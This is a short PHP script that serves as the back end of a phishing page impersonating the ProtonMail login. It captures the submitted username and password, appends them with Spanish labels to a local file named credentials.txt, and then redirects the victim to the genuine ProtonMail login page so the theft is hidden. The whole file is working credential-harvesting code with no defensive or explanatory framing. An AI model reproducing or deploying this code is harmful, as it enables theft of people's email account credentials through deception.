<?php

file_put_contents("credentials.txt", "[+] Protonmail -> Usuario: " . $_POST['username'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://beta.protonmail.com/login');
exit();
?>
